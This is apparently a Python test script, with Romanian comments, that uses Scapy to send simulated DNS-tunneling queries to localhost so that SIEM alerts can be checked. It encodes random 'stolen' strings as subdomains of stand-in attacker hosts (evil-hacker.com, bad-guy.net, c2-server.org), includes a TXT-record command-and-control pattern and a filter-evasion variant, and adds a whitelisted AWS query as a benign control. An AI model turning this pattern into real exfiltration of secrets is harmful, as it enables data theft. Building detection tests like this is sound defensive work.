from scapy.all import IP, UDP, DNS, DNSQR, send
import random
import string
import time

def generate_high_entropy_string(length):
    """Generează un șir de caractere aleatorii (simulează date criptate Base64)"""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def simulate_dns_tunneling():
    print("🚀 Începem simularea atacurilor de DNS Tunneling (Data Exfiltration)...")
    time.sleep(2)

    # --- ATACUL 1: Exfiltrare standard (Entropie Mare) ---
    # Generăm o "parolă furată" de 25 de caractere amestecate
    stolen_data1 = generate_high_entropy_string(25)
    domain1 = f"{stolen_data1}.evil-hacker.com"
    print(f"\n[1] Trimitem Atacul 1 (Entropie Mare): {domain1}")
    pkt1 = IP(dst="127.0.0.1") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain1, qtype="A"))
    send(pkt1, verbose=False)
    time.sleep(2)

    # --- ATACUL 2: Exfiltrare "Oversized" (Foarte lung + Entropie moderată) ---
    # Combinăm cuvinte cu caractere random pentru a fenta filtrele simple
    stolen_data2 = "admin-password-dump-" + generate_high_entropy_string(35)
    domain2 = f"{stolen_data2}.bad-guy.net"
    print(f"\n[2] Trimitem Atacul 2 (Oversized): {domain2}")
    pkt2 = IP(dst="127.0.0.1") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain2, qtype="A"))
    send(pkt2, verbose=False)
    time.sleep(2)

    # --- ATACUL 3: Cerere TXT Suspectă (Command & Control) ---
    stolen_data3 = generate_high_entropy_string(18)
    domain3 = f"{stolen_data3}.c2-server.org"
    print(f"\n[3] Trimitem Atacul 3 (TXT Record C&C): {domain3}")
    pkt3 = IP(dst="127.0.0.1") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain3, qtype="TXT"))
    send(pkt3, verbose=False)
    time.sleep(2)

    # --- TESTUL 4: Trafic Legitim (Whitelist) ---
    # Acest pachet ESTE extrem de lung, dar se termină în amazonaws.com
    # Interfața TA NU ar trebui să dea nicio alertă pentru el!
    domain4 = "ec2-198-51-100-14-compute-1.amazonaws.com"
    print(f"\n[4] Trimitem Trafic Legitim (Whitelist AWS): {domain4}")
    pkt4 = IP(dst="127.0.0.1") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain4, qtype="A"))
    send(pkt4, verbose=False)

    print("\n✅ Simulare completă! Verifică interfața SIEM pentru alerte.")

if __name__ == "__main__":
    simulate_dns_tunneling()